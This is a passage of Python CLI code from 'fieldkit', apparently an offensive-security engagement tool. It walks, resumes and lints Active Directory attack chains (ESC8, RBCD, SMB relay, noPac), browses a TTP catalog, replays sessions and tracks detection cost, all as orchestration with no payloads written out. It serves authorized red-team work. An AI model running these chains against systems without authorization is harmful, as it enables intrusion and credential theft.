    when --signals is passed."""
    from . import chain as chain_mod
    row = store.chain_by_id(args.chain_id)
    if not row:
        _err(f"no chain #{args.chain_id} in this engagement")
        return 2
    print(f"chain #{row['id']}: {row['profile']} → {row['target']}")
    print(f"  status={row['status']}  detection debt={row['total_detection_cost']}")
    print(f"  started {row['started_at'] or '-'}  finished {row['finished_at'] or '-'}")
    if row["aborted_reason"]:
        print(f"  aborted: {row['aborted_reason']}")
    trail = store.chain_step_trail(args.chain_id)
    print(f"\ntrail ({len(trail)} steps):")
    for t in trail:
        print(f"  {t['idx']:>2}. {t['step_name']:30s}  [{t['step_kind']:14s}]  "
              f"{t['outcome_kind']:6s}  cost={t['detection_cost']}  {t['evidence']}")

    # --signals renders the per-step signal breakdown, sourced from
    # the live profile registry (not the DB — signal catalogs live in
    # code and evolve slice-to-slice, so a re-render always reflects
    # the current catalog).
    if getattr(args, "signals", False):
        try:
            live = chain_mod.profile(row["profile"])(row["target"])
        except KeyError:
            print(f"\nprofile {row['profile']!r} no longer registered — "
                  "signal breakdown unavailable")
            return 0
        by_name = {s.name: s for s in live.steps}
        print("\ndetection signals:")
        for t in trail:
            step = by_name.get(t["step_name"])
            if step is None or not step.signals:
                continue
            print(f"  {t['step_name']}:")
            for sig in step.signals:
                count = f" ×{sig.count}" if sig.count != 1 else ""
                note = f"  # {sig.note}" if sig.note else ""
                print(f"    {sig.kind:14s} {sig.identifier}{count}{note}")
    return 0


@needs_engagement
def cmd_chain_walk(args, store):
    """Interactive walker — pauses before each step for operator
    confirm. Same underlying `walk()` as `chain run`, plus a
    per-step prompt: [g]o (default) / [s]kip / [q]uit.

    Skipping records a manual outcome and advances to the next step
    (chain continues); quitting records a manual outcome and stops
    the walk (chain status = in_progress, resumable via a follow-up
    `chain run`).
    """
    from . import chain as chain_mod
    try:
        factory = chain_mod.profile(args.profile)
    except KeyError as exc:
        _err(str(exc))
        return 2
    ch = factory(args.target)

    cred_dict = None
    if args.cred_id:
        row = store.credential_by_id(args.cred_id)
        if not row:
            _err(f"no credential #{args.cred_id} in this engagement")
            return 2
        cred_dict = {"domain": row["domain"], "username": row["username"],
                     "password": row["password"]}

    class _Ctx:
        probe_port = args.probe_port
        probe_timeout = args.probe_timeout
        listener_uri = args.listener
        cred = cred_dict
        listener_ip = args.listener_ip
        ca_endpoint = args.ca
        template = args.template
        relay_port_smb = args.relay_port_smb
        relay_port_http = args.relay_port_http
        relay_wait_capture = args.relay_capture_timeout
        domain = args.domain
        relay_mode = args.relay_mode
        relay_target = args.relay_target
        impersonate = args.impersonate
        dc_ip = args.dc_ip
    _Ctx.store = store

    print(f"\ninteractive walk — {ch.profile} against {ch.target}")
    print(f"  {len(ch.steps)} steps queued; per step, choose "
          f"[g]o (default) / [s]kip / [q]uit\n")

    def _before(chain, step):
        cost = step.signal_cost if step.signals else step.detection_cost
        prompt = (f"  next: {step.name}  [{step.kind}]  cost={cost}\n"
                  f"    → [g]o (default), [s]kip, [q]uit: ")
        try:
            ans = input(prompt).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return "stop"
        if ans in ("s", "skip"):
            return "skip"
        if ans in ("q", "quit", "stop"):
            return "stop"
        return "go"

    def _render(chain, step, outcome):
        marker = {"ok": "  ok ", "manual": " man ", "skip": "skip ",
                  "fail": "FAIL "}[outcome.kind]
        print(f"    {marker} {step.name}  {outcome.evidence}")

    chain_id = store.reserve_chain_id(ch)
    ch._persisted_id = chain_id                  # noqa: SLF001
    chain_mod.walk(ch, _Ctx(), on_step=_render, before_step=_before)
    store.finalize_chain(chain_id, ch)
    total_cost = ch.total_detection_cost
    print(f"\nchain #{chain_id}  status={ch.status}  "
          f"detection cost so far = {total_cost}")
    if ch.aborted_reason:
        print(f"aborted: {ch.aborted_reason}")
        return 1
    if ch.status == "in_progress":
        return 1
    return 0


@needs_engagement
def cmd_refresh(args, store):
    """Returning-operator one-liner: re-ingest a recce bridge, then
    run analyze so the latest moves surface without three separate
    commands.

    Prints the counts delta (hosts / creds / findings before vs
    after) so a returning operator sees at a glance what changed.
    Analyze output follows verbatim — same ranking, same
    `escalate <host>` hints — so the operator can copy-paste a
    next move directly.

    Exit codes:
      * 0 — refresh + analyze completed cleanly;
      * 1 — bridge ingest failed but analyze still ran on
        previously-ingested state;
      * 2 — bad invocation.
    """
    before = store.counts()
    ingest_ok = True
    if args.bridge:
        rc = _refresh_from_recce(args.bridge, store)
        ingest_ok = (rc == 0)
        if ingest_ok:
            print(f"[refresh] re-ingested {args.bridge}")
        else:
            print("[refresh] ingest failed — continuing with "
                  "previously-ingested state")
    else:
        cfg = config_mod.load(store)
        bridge = cfg.get("recce_bridge") or ""
        if bridge:
            rc = _refresh_from_recce(bridge, store)
            ingest_ok = (rc == 0)
            if ingest_ok:
                print(f"[refresh] re-ingested {bridge}  (from "
                      f"config recce_bridge)")
        else:
            print("[refresh] no bridge path — analyze only "
                  "(pass a path or `config set recce_bridge=...`)")

    after = store.counts()
    deltas = []
    for k in ("hosts", "services", "credentials", "findings",
              "proven_findings", "access"):
        if after[k] != before[k]:
            deltas.append(f"{k}: {before[k]}→{after[k]}")
    if deltas:
        print(f"[refresh] state changed — {', '.join(deltas)}")
    else:
        print("[refresh] no state change")
    print()

    # Now delegate to cmd_analyze — same output as `fieldkit analyze`
    # so the ranked moves + escalate hints surface uniformly. We
    # pass args.proof through so `refresh --proof` behaves like
    # `analyze --proof`.
    class _AnalyzeArgs:
        proof = getattr(args, "proof", False)
        refresh = None                    # already re-ingested
    rc = cmd_analyze.__wrapped__(_AnalyzeArgs(), store)
    if rc != 0:
        return rc
    return 0 if ingest_ok else 1


def cmd_session_log(args):
    """Print the shell export line the operator needs to enable
    recording. Meant for ``eval $(fieldkit session log --enable)``
    or manual copy-paste."""
    from . import session as session_mod
    if not args.enable and not args.disable:
        current = session_mod.log_path()
        if current:
            print(f"recording enabled — writing to {current}")
        else:
            print("recording disabled — export FIELDKIT_SESSION_LOG=<path> "
                  "to enable, or run `fieldkit session log --enable`.")
        return 0
    if args.disable:
        print(f"unset {session_mod.ENV_VAR}")
        return 0
    # --enable
    path = os.path.abspath(args.out or "fieldkit-session.jsonl")
    print(f"export {session_mod.ENV_VAR}={path}")
    _err(f"# writes JSONL to {path} for every subsequent "
         f"`fieldkit ...` invocation — eval the export above")
    return 0


def cmd_session_show(args):
    """Pretty-print the entries in ``args.log``."""
    from . import session as session_mod
    entries = session_mod.read(args.log)
    if not entries:
        _err(f"no entries in {args.log} (empty log or unreadable file)")
        return 1
    if args.json:
        import json as _json
        for e in entries:
            print(_json.dumps(e.to_dict()))
        return 0
    print(f"{len(entries)} entries in {args.log}:\n")
    print(f"  {'timestamp':<25}  {'rc':>3}  {'dur':>6}  argv")
    for e in entries:
        argv_str = " ".join(e.argv)
        if len(argv_str) > 70:
            argv_str = argv_str[:67] + "..."
        print(f"  {e.timestamp:<25}  {e.exit_code:>3}  "
              f"{e.duration_ms:>4}ms  {argv_str}")
    return 0


def cmd_session_replay(args):
    """Re-run every recorded invocation in ``args.log``. Returns
    the last non-zero exit code (or 0 if every entry succeeded).
    ``--dry-run`` prints without executing."""
    from . import session as session_mod
    entries = session_mod.read(args.log)
    if not entries:
        _err(f"no entries in {args.log}")
        return 1
    print(f"{'dry-run: ' if args.dry_run else ''}"
          f"replaying {len(entries)} entries from {args.log}\n")
    def _on(entry, rc):
        argv_str = " ".join(entry.argv)
        if len(argv_str) > 60:
            argv_str = argv_str[:57] + "..."
        marker = "  --  " if rc is None else f"  {rc:>3}  "
        print(f"  [{entry.timestamp}]{marker}fieldkit {argv_str}")
    results = session_mod.replay(args.log, on_entry=_on,
                                   dry_run=args.dry_run)
    if args.dry_run:
        print(f"\n(dry-run: {len(results)} entries would have run)")
        return 0
    nonzero = [rc for _, rc in results if rc != 0]
    if nonzero:
        print(f"\n{len(nonzero)}/{len(results)} entries returned "
              f"non-zero exit codes")
        return max(nonzero)
    print(f"\nall {len(results)} entries replayed cleanly")
    return 0


def cmd_ttps_list(args):
    """Browse the shipped TTP catalog. Optional --grep filter runs
    against key + name + technique + tactic (case-insensitive).
    Prints one row per TTP: key, technique, platforms, ranking
    triple. Read-only — no store."""
    from .ttps import load_all
    tt = load_all()
    needle = (args.grep or "").lower().strip() if getattr(args, "grep", None) else ""
    if needle:
        def _match(t):
            hay = (f"{t.key} {t.name} {t.technique} "
                    f"{' '.join(t.tactic)} {t.report.vector_type}").lower()
            return needle in hay
        tt = [t for t in tt if _match(t)]
    tt.sort(key=lambda t: (t.technique, t.key))
    if not tt:
        print("no TTPs match" + (f" `{needle}`" if needle else ""))
        return 0
    print(f"{len(tt)} TTP(s):\n")
    print(f"  {'technique':<12} {'key':<44} {'platform':<12} "
          f"{'exploit':<8} {'safety':<14} {'detection':<10}")
    for t in tt:
        plats = ",".join(t.platform)[:12]
        r = t.ranking
        print(f"  {t.technique:<12} {t.key:<44} {plats:<12} "
               f"{r.exploitability:<8} {r.safety:<14} {r.detection:<10}")
    return 0


def cmd_ttps_validate(args):
    """Validate one or more YAML TTP files against the shipped
    loader schema. Accepts a file path or a directory (walks
    every ``*.yaml`` beneath it). Emits per-file OK / ERR lines;
    exits 2 if any file fails.

    Useful for pre-flight before landing a new TTP: run
    ``fieldkit ttps validate fieldkit/ttps/new.yaml`` and every
    schema error (missing field, bad platform, malformed
    version-range) surfaces without polluting the shipped
    catalog."""
    from .ttps import loader as ttp_loader
    paths = []
    if os.path.isdir(args.path):
        for root, _dirs, files in os.walk(args.path):
            for f in sorted(files):
                if f.endswith(".yaml"):
                    paths.append(os.path.join(root, f))
    elif os.path.isfile(args.path):
        paths = [args.path]
    else:
        _err(f"{args.path}: no such file or directory")
        return 2
    if not paths:
        _err(f"{args.path}: no .yaml files found")
        return 2

    ok_count = err_count = 0
    for p in paths:
        rel = os.path.relpath(p)
        try:
            ttp_loader.load_file(p)
            print(f"  ok   {rel}")
            ok_count += 1
        except ttp_loader.LoaderError as exc:
            # Strip the source-file prefix from the message since
            # we're already printing it in the marker.
            msg = str(exc)
            print(f"  ERR  {rel}")
            print(f"       → {msg}")
            err_count += 1
    print(f"\n{ok_count}/{ok_count + err_count} valid")
    return 2 if err_count else 0


def cmd_ttps_show(args):
    """Pretty-print one TTP by key. Renders every populated field
    (detect, execute, verify, cleanup, report, playbook) — the
    same shape the YAML carries, but resolved through the loader
    so a bad TTP surfaces the parse error rather than raw yaml."""
    from .ttps import load_all
    tt = [t for t in load_all() if t.key == args.key]
    if not tt:
        _err(f"no TTP with key {args.key!r} — "
             "`fieldkit ttps list` shows every key")
        return 2
    t = tt[0]
    def _sep(title):
        print(f"\n  ── {title} " + "─" * (56 - len(title)))
    print(f"key       : {t.key}")
    print(f"name      : {t.name}")
    print(f"technique : {t.technique}")
    print(f"tactic    : {', '.join(t.tactic)}")
    print(f"platform  : {', '.join(t.platform)}")
    r = t.ranking
    print(f"ranking   : exploit={r.exploitability}  "
          f"safety={r.safety}  detection={r.detection}")
    if t.detect:
        _sep("detect")
        print(f"  kind : {t.detect.kind}")
        for k, v in (t.detect.value or {}).items():
            print(f"  {k}: {v}")
    if t.execute and t.execute.command:
        _sep("execute")
        print(t.execute.command.strip())
    if t.verify and t.verify.success:
        _sep("verify")
        print(f"success: {t.verify.success}")
    if t.cleanup and t.cleanup.command:
        _sep("cleanup")
        print(t.cleanup.command.strip())
    if t.report:
        _sep("report")
        print(f"vector_type : {t.report.vector_type}")
        if t.report.evidence:
            print(f"evidence    : {t.report.evidence}")
        if t.report.description:
            print(f"description :\n  {t.report.description.strip()}")
        if t.report.remediation:
            print(f"remediation :\n  {t.report.remediation.strip()}")
        if t.report.refs:
            print(f"refs        : {', '.join(t.report.refs)}")
    if t.playbook:
        _sep("playbook")
        if t.playbook.summary:
            print(f"summary : {t.playbook.summary.strip()}")
        if t.playbook.place:
            print(f"place   : {t.playbook.place}")
        if t.playbook.steps:
            print("steps   :")
            for i, s in enumerate(t.playbook.steps, 1):
                print(f"  {i}. {s}")
        if t.playbook.restore:
            print(f"restore : {t.playbook.restore}")
    print(f"\nsource: {t.source_path}")
    return 0


def cmd_doctor(args):
    """One health-check for the whole install + current engagement.

    Runs tools/chains/ttps probes always; engagement probe when a
    store can be opened (a fresh box with no DB still gets useful
    output — tools + lint fire even without state).

    Exit codes:
      * 0 — every probe ``ok``;
      * 1 — one or more warnings, no errors;
      * 2 — one or more errors, or bad invocation.
    """
    from . import doctor
    store = None
    try:
        # _open_store returns a context manager; drop the with-block
        # so probe_engagement can read the store, then close in
        # finally. Missing DB / bad path → store stays None and
        # engagement probe is skipped.
        cm = _open_store(args)
        store = cm.__enter__()
    except Exception:                                       # noqa: BLE001
        cm = None
    try:
        reports, code = doctor.run(store=store)
        actions = doctor.fix(reports, store=store) \
            if getattr(args, "fix", False) else []

        if getattr(args, "json", False):
            import json as _json
            payload = {
                "exit_code": code,
                "reports": [{
                    "name": r.name, "rung": r.rung,
                    "message": r.message, "details": r.details,
                } for r in reports],
            }
            if getattr(args, "fix", False):
                payload["fix_actions"] = [
                    {"action": a, "outcome": o} for a, o in actions]
                # Re-run probes after fixes to reflect what's now green.
                if any(o == "fixed" for _, o in actions):
                    post_reports, post_code = doctor.run(store=store)
                    payload["post_fix"] = {
                        "exit_code": post_code,
                        "reports": [{
                            "name": r.name, "rung": r.rung,
                            "message": r.message, "details": r.details,
                        } for r in post_reports],
                    }
                    code = post_code
            print(_json.dumps(payload, indent=2))
            return code

        rung_marker = {"ok": "ok  ", "warning": "warn",
                        "error": "ERR "}
        print("fieldkit doctor\n")
        for r in reports:
            print(f"  {rung_marker[r.rung]}  {r.name:<12}  {r.message}")
            for d in r.details:
                print(f"           - {d}")
        print()
        n_ok = sum(1 for r in reports if r.rung == "ok")
        n_warn = sum(1 for r in reports if r.rung == "warning")
        n_err = sum(1 for r in reports if r.rung == "error")
        print(f"summary: {n_ok} ok, {n_warn} warning(s), {n_err} error(s)")

        if actions:
            print("\nfix actions:")
            marker = {"fixed": "fixed  "}
            for a, o in actions:
                m = "fixed  " if o == "fixed" else \
                    ("skipped" if o.startswith("skipped") else "FAILED ")
                print(f"  {m}  {a}")
                if o != "fixed":
                    # Show the skip / failure reason indented under
                    detail = o.split(":", 1)[1].strip() if ":" in o else o
                    print(f"           → {detail}")
            fixed_count = sum(1 for _, o in actions if o == "fixed")
            if fixed_count:
                # Re-probe to reflect fixed state
                post_reports, post_code = doctor.run(store=store)
                print(f"\npost-fix re-probe: exit code {post_code} "
                      f"(was {code}; {fixed_count} action(s) applied)")
                code = post_code
        return code
    finally:
        if cm is not None:
            try:
                cm.__exit__(None, None, None)
            except Exception:                               # noqa: BLE001
                pass


@needs_engagement
def cmd_diff(args, store):
    """Compare findings between the current engagement and a
    baseline DB. Emits three sections: new (in current, absent
    in baseline), gone (in baseline, absent in current),
    unchanged.

    Identity for a finding is the tuple (vector_type,
    affected_host, title) — same key report.build() renders by.
    Same identity landing in both engagements = "unchanged"
    (severity / evidence content aren't compared here — a diff
    of proof content is a subsequent surface).

    Read-only over both DBs. Exit 0 always (empty diff is a
    valid result); use ``--json`` for a CI-parseable summary.
    """
    baseline_path = args.baseline
    if not os.path.isfile(baseline_path):
        _err(f"{baseline_path}: no such file")
        return 2
    try:
        baseline_store = Store.open(baseline_path)
    except Exception as exc:                                # noqa: BLE001
        _err(f"{baseline_path}: cannot open: {exc}")
        return 2
    try:
        baseline_row = baseline_store.engagement()
        if baseline_row is None:
            _err(f"{baseline_path}: no engagement in this DB")
            return 2
        baseline_findings = list(baseline_store.findings(
            proven_only=not args.include_observations))
    finally:
        baseline_store.close()

    current_findings = list(store.findings(
        proven_only=not args.include_observations))

    def _key(f):
        return (f["vector_type"] or "",
                f["title"] or "",
                # affected_host via host_id lookup at render time is
                # heavy; use host_id itself as the identity for now
                f["host_id"] or 0)

    def _label(f, store_obj):
        host = store_obj.host_by_id(f["host_id"]) if f["host_id"] else None
        host_label = (host["ip"] if host else "?")
        return f"{f['title'] or f['vector_type']} on {host_label}"

    current_by_key = {_key(f): f for f in current_findings}
    baseline_by_key = {_key(f): f for f in baseline_findings}

    new_keys = set(current_by_key) - set(baseline_by_key)
    gone_keys = set(baseline_by_key) - set(current_by_key)
    both_keys = set(current_by_key) & set(baseline_by_key)

    current_row = store.engagement()

    if args.json:
        import json as _json
        # Re-open baseline briefly to resolve host labels for gone
        # findings.
        baseline_store2 = Store.open(baseline_path)
        try:
            payload = {
                "current": current_row["name"],
                "baseline": baseline_row["name"],
                "new": [_label(current_by_key[k], store) for k in sorted(new_keys)],
                "gone": [_label(baseline_by_key[k], baseline_store2)
                         for k in sorted(gone_keys)],
                "unchanged": [_label(current_by_key[k], store)
                               for k in sorted(both_keys)],
                "counts": {
                    "new": len(new_keys),
                    "gone": len(gone_keys),
                    "unchanged": len(both_keys),
                },
            }
        finally:
            baseline_store2.close()
        print(_json.dumps(payload, indent=2))
        return 0

    print(f"finding diff: [current] {current_row['name']!r} "
          f"vs [baseline] {baseline_row['name']!r}\n")
    print(f"  new:       {len(new_keys):>3}")
    print(f"  gone:      {len(gone_keys):>3}")
    print(f"  unchanged: {len(both_keys):>3}")
    print()

    if new_keys:
        print("NEW (present in current, absent in baseline):")
        for k in sorted(new_keys):
            print(f"  + {_label(current_by_key[k], store)}")
        print()
    if gone_keys:
        print("GONE (present in baseline, absent in current):")
        baseline_store2 = Store.open(baseline_path)
        try:
            for k in sorted(gone_keys):
                print(f"  - {_label(baseline_by_key[k], baseline_store2)}")
        finally:
            baseline_store2.close()
        print()
    if both_keys and args.verbose:
        print("UNCHANGED:")
        for k in sorted(both_keys):
            print(f"  = {_label(current_by_key[k], store)}")
        print()
    return 0


def cmd_engagements_list(args):
    """Walk a directory for engagement DBs (*.db) and emit a
    per-DB summary: name, created, hosts/creds/findings counts,
    absolute path.

    Cross-engagement view — fieldkit's core CLI only works on
    one DB at a time; this surface lets an operator see every
    engagement across a directory tree without switching between
    them one at a time. Default dir is CWD; --dir overrides.
    Read-only: opens each DB read-only, never modifies.
    """
    import glob
    root = args.dir or os.getcwd()
    if not os.path.isdir(root):
        _err(f"{root}: not a directory")
        return 2
    if args.recursive:
        db_paths = sorted(glob.glob(os.path.join(root, "**/*.db"),
                                       recursive=True))
    else:
        db_paths = sorted(glob.glob(os.path.join(root, "*.db")))
    if not db_paths:
        print(f"no *.db files found under {root}"
              + (" (recursive)" if args.recursive else ""))
        return 0

    active = os.environ.get(DB_ENV_VAR, "")
    rows = []
    for p in db_paths:
        # A .db that isn't a fieldkit engagement (some other tool's
        # sqlite file) is fine — Store.open reads the engagement
        # row; missing row means "not a fieldkit DB" and we skip
        # rather than fail the whole listing.
        try:
            store = Store.open(p)
        except Exception:                                   # noqa: BLE001
            continue
        try:
            row = store.engagement()
            if row is None:
                continue
            counts = store.counts()
            rows.append({
                "path": p,
                "name": row["name"],
                "created": row["created"],
                "hosts": counts["hosts"],
                "creds": counts["credentials"],
                "findings": counts["findings"],
            })
        finally:
            store.close()

    if not rows:
        print(f"{len(db_paths)} .db files under {root}, "
              f"none are fieldkit engagements")
        return 0

    if getattr(args, "json", False):
        import json as _json
        payload = [{
            **r,
            "active": os.path.abspath(r["path"]) == os.path.abspath(active or "")
        } for r in rows]
        print(_json.dumps(payload, indent=2))
        return 0

    print(f"{len(rows)} engagement(s) under {root}:\n")
    print(f"  {'name':<28}  {'hosts':>5}  {'creds':>5}  "
          f"{'find':>5}  path")
    for r in rows:
        marker = "▸" if os.path.abspath(r["path"]) == os.path.abspath(active or "") else " "
        name = r["name"][:28]
        rel = os.path.relpath(r["path"])
        print(f"{marker} {name:<28}  {r['hosts']:>5}  {r['creds']:>5}  "
              f"{r['findings']:>5}  {rel}")
    if active:
        print(f"\n▸ = active engagement (via ${DB_ENV_VAR})")
    else:
        print(f"\nno active engagement — "
              f"`fieldkit engagements switch <path>` prints the export line")
    return 0


def cmd_engagements_switch(args):
    """Print the shell export line to make ``args.path`` the
    active engagement DB for subsequent invocations. Meant for
    ``eval $(fieldkit engagements switch eng.db)`` — same
    pattern as ``session log --enable``."""
    if not os.path.isfile(args.path):
        _err(f"{args.path}: no such file")
        return 2
    # Verify it's a fieldkit engagement before printing an export.
    try:
        store = Store.open(args.path)
        try:
            row = store.engagement()
        finally:
            store.close()
    except Exception as exc:                                # noqa: BLE001
        _err(f"{args.path}: not a valid fieldkit DB: {exc}")
        return 2
    if row is None:
        _err(f"{args.path}: opens but has no engagement row "
             "(run `fieldkit init <name> --db {args.path}` first)")
        return 2
    abspath = os.path.abspath(args.path)
    print(f"export {DB_ENV_VAR}={abspath}")
    _err(f"# active engagement: {row['name']!r} — eval the "
         f"export above")
    return 0


def cmd_changelog(args):
    """Auto-generate a CHANGELOG.md from git commit history.

    Reads `git log` for conventional-commit-shaped subjects
    (feat / fix / refactor / chore / docs / test), groups by
    prefix, and emits a markdown changelog.

    Output goes to stdout by default; ``--out PATH`` writes to
    a file. ``--since <ref>`` limits history from a git ref
    (tag, commit, or `HEAD~50`); default is the whole history.
    Read-only — never edits git state.
    """
    import re as _re
    argv = ["git", "log", "--pretty=format:%h|%s"]
    if args.since:
        argv.append(f"{args.since}..HEAD")
    result = runner_mod.run(argv, timeout=30)
    if result.error:
        _err(f"git log failed: {result.error}")
        return 2
    if result.exit_code not in (0, None):
        _err(f"git log exited {result.exit_code}: "
             f"{(result.stderr or '').strip()[:200]}")
        return 2

    # Group commits by conventional-commit prefix.
    # Match `type(scope): message` OR `type: message`.
    pat = _re.compile(r"^(\w+)(?:\(([^)]+)\))?:\s*(.*)")
    sections = {}
    other = []
    total = 0
    for line in (result.stdout or "").splitlines():
        if not line.strip():
            continue
        total += 1
        try:
            sha, subject = line.split("|", 1)
        except ValueError:
            continue
        m = pat.match(subject)
        if m:
            ctype = m.group(1)
            scope = m.group(2) or ""
            msg = m.group(3)
            sections.setdefault(ctype, []).append((sha, scope, msg))
        else:
            other.append((sha, subject))

    # Rendering order: feat first (users care most), fix, refactor,
    # docs, test, chore, then "other" (non-conventional commits).
    order = ("feat", "fix", "refactor", "docs", "test",
             "chore", "perf", "style", "build", "ci")
    labels = {
        "feat":     "Features",
        "fix":      "Bug fixes",
        "refactor": "Refactoring",
        "docs":     "Documentation",
        "test":     "Tests",
        "chore":    "Chores + housekeeping",
        "perf":     "Performance",
        "style":    "Style",
        "build":    "Build",
        "ci":       "CI",
    }
    lines = ["# Changelog", ""]
    if args.since:
        lines.append(f"Commits since `{args.since}` ({total} total).")
    else:
        lines.append(f"Auto-generated from git log ({total} commits).")
    lines.append("")
    for ctype in order:
        entries = sections.pop(ctype, [])
        if not entries:
            continue
        lines.append(f"## {labels[ctype]}")
        lines.append("")
        for sha, scope, msg in entries:
            scope_str = f"**{scope}:** " if scope else ""
            lines.append(f"- `{sha}` {scope_str}{msg}")
        lines.append("")
    # Any remaining conventional-commit types not in `order`.
    for ctype, entries in sorted(sections.items()):
        lines.append(f"## {ctype.capitalize()}")
        lines.append("")
        for sha, scope, msg in entries:
            scope_str = f"**{scope}:** " if scope else ""
            lines.append(f"- `{sha}` {scope_str}{msg}")
        lines.append("")
    if other:
        lines.append("## Other")
        lines.append("")
        for sha, subject in other:
            lines.append(f"- `{sha}` {subject}")
        lines.append("")

    text = "\n".join(lines)
    if args.out:
        with open(args.out, "w") as fh:
            fh.write(text)
        print(f"wrote {args.out}  ({total} commits, "
              f"{len([1 for e in sections.values() for _ in e]) + sum(len(e) for e in sections.values())} classified)")
    else:
        print(text)
    return 0


def cmd_chain_register(args):
    """Install a YAML-defined chain profile into
    ~/.fieldkit/chains/ so it auto-loads on future invocations.
    Validates first — a bad YAML never lands in the auto-load
    dir. Exit 0 install, 2 on validation error."""
    from . import chain_yaml
    try:
        dest = chain_yaml.install_yaml(args.from_yaml)
    except chain_yaml.ChainYamlError as exc:
        _err(str(exc))
        return 2
    print(f"installed → {dest}")
    print("chain will auto-load on the next `fieldkit ...` invocation")
    return 0


def cmd_chain_unregister(args):
    """Remove a YAML-defined chain profile from
    ~/.fieldkit/chains/. Only affects user-installed profiles;
    shipped profiles can't be removed via this command."""
    from . import chain_yaml
    from . import chain as chain_mod
    shipped = {"esc8", "rbcd", "smb-relay-exec", "esc1", "nopac"}
    if args.name in shipped:
        _err(f"{args.name!r} is a shipped profile — can't unregister")
        return 2
    if chain_yaml.uninstall(args.name):
        print(f"removed ~/.fieldkit/chains/{args.name}.yaml + "
              f"in-memory registration")
    else:
        _err(f"no user-installed chain named {args.name!r} — "
             f"check `fieldkit chain list-profiles`")
        return 2
    return 0


def cmd_chain_list_profiles(args):
    """One line per registered chain profile — name + step count +
    total detection cost + shipped/user origin. Read-only."""
    from . import chain as chain_mod
    from . import chain_yaml
    _ = args
    shipped = {"esc8", "rbcd", "smb-relay-exec", "esc1", "nopac"}
    user_names = set()
    if os.path.isdir(chain_yaml.USER_CHAINS_DIR):
        for f in os.listdir(chain_yaml.USER_CHAINS_DIR):
            if f.endswith(".yaml"):
                user_names.add(f[:-5])
    profiles = chain_mod.known_profiles()
    if not profiles:
        print("no chain profiles registered")
        return 0
    print(f"{len(profiles)} chain profile(s) registered:\n")
    print(f"  {'name':<24}  {'steps':>5}  {'cost':>5}  origin")
    for p in profiles:
        try:
            factory = chain_mod.profile(p)
            ch = factory("<target>")
            cost = ch.total_detection_cost or sum(
                s.signal_cost if s.signals else s.detection_cost
                for s in ch.steps)
            origin = "user" if p in user_names \
                else "shipped" if p in shipped else "session"
            print(f"  {p:<24}  {len(ch.steps):>5}  {cost:>5}  {origin}")
        except Exception as exc:                            # noqa: BLE001
            print(f"  {p:<24}  ????  ????  factory-fails: {exc}")
    return 0


def cmd_chain_lint(args):
    """Coverage audit for every registered chain profile — surfaces
    plan gaps (missing signals, duplicate step names, preflight
    misplacement) before they show up in a report or a debt view.

    Exit codes:
      * 0 — no findings across the scoped profiles;
      * 1 — one or more warnings, no errors;
      * 2 — one or more errors, or bad invocation.
    """
    from . import chain as chain_mod
    from . import chainlint
    if args.profile:
        try:
            chain_mod.profile(args.profile)
        except KeyError as exc:
            _err(str(exc))
            return 2
        profiles = [args.profile]
    else:
        profiles = chain_mod.known_profiles()
    if not profiles:
        if getattr(args, "json", False):
            import json as _json
            print(_json.dumps({
                "profiles": [], "findings": [],
                "summary": {"ok": 0, "warn": 0, "err": 0},
            }))
        else:
            print("no chain profiles registered — nothing to audit")
        return 0
    findings = []
    for p in profiles:
        findings.extend(chainlint.audit_profile(p))
    ok, warn, err = chainlint.summarize(findings, profiles)

    if getattr(args, "json", False):
        # Machine-readable output for CI. One flat JSON object;
        # nothing on stderr (parseable by `chain lint --json | jq`).
        # Exit code carries the pass/warn/fail signal so the CI job
        # can gate on it directly.
        import json as _json
        payload = {
            "profiles": profiles,
            "findings": [{
                "profile": f.profile,
                "code": f.code,
                "severity": f.severity,
                "step_index": f.step_index,
                "step_name": f.step_name,
                "message": f.message,
            } for f in findings],
            "summary": {"ok": ok, "warn": warn, "err": err},
        }
        print(_json.dumps(payload, indent=2))
        if err:
            return 2
        if warn:
            return 1
        return 0

    by_profile = {}
    for f in findings:
        by_profile.setdefault(f.profile, []).append(f)
    print(f"chain lint: {len(profiles)} profile(s) inspected\n")
    for p in profiles:
        try:
            ch = chain_mod.profile(p)("<lint-target>")
            cost = ch.total_detection_cost or sum(
                s.signal_cost if s.signals else s.detection_cost
                for s in ch.steps)
            header = f"▸ {p}   {len(ch.steps)} steps, {cost} cost"
        except Exception:                                       # noqa: BLE001
            header = f"▸ {p}   (factory failure — see finding)"
        print(header)
        fs = by_profile.get(p, [])
        if not fs:
            print("  ok   no findings")
        else:
            for f in fs:
                marker = "ERR " if f.severity == "error" else "warn"
                loc = (f" step {f.step_index} {f.step_name!r}"
                       if f.step_index is not None else "")
                print(f"  {marker}{loc}  [{f.code}]  {f.message}")
        print()
    print(f"summary: {ok} ok, {warn} with warnings, {err} with errors")
    if err:
        return 2
    if warn:
        return 1
    return 0


@needs_engagement
def cmd_chain_resume(args, store):
    """Pick up an ``in_progress`` chain from where the previous walk
    stopped. Same walker semantics as ``chain run``/``chain walk``;
    the difference is the chain object is seeded from the persisted
    trail rather than a fresh factory call.

    Exit codes match ``chain run``: 0 proven, 1 aborted/in_progress,
    2 bad invocation. Non-resumable chains (proven/aborted) surface
    a hard error rather than a silent re-walk — those are terminal.
    """
    from . import chain as chain_mod
    try:
        ch = chain_mod.resume(store, args.chain_id)
    except KeyError as exc:
        _err(str(exc))
        return 2
    except ValueError as exc:
        _err(str(exc))
        return 2

    cred_dict = None
    if args.cred_id:
        row = store.credential_by_id(args.cred_id)
        if not row:
            _err(f"no credential #{args.cred_id} in this engagement")
            return 2
        cred_dict = {"domain": row["domain"], "username": row["username"],
                     "password": row["password"]}

    class _Ctx:
        probe_port = args.probe_port
        probe_timeout = args.probe_timeout
        listener_uri = args.listener
        cred = cred_dict
        listener_ip = args.listener_ip
        ca_endpoint = args.ca
        template = args.template
        relay_port_smb = args.relay_port_smb
        relay_port_http = args.relay_port_http
        relay_wait_capture = args.relay_capture_timeout
        domain = args.domain
        relay_mode = args.relay_mode
        relay_target = args.relay_target
        impersonate = args.impersonate
        dc_ip = args.dc_ip
    _Ctx.store = store

    done = len(ch.outcomes)
    total = len(ch.steps)
    print(f"resuming chain #{args.chain_id}: {ch.profile} → {ch.target}")
    print(f"  {done}/{total} steps already walked; "
          f"continuing from step {done}")
    if not _confirm(
            f"resume walk (continues from step {done})?",
            args.yes):
        print("aborted — chain state unchanged")
        return 1

    def _before(chain, step):
        cost = step.signal_cost if step.signals else step.detection_cost
        prompt = (f"  next: {step.name}  [{step.kind}]  cost={cost}\n"
                  f"    → [g]o (default), [s]kip, [q]uit: ")
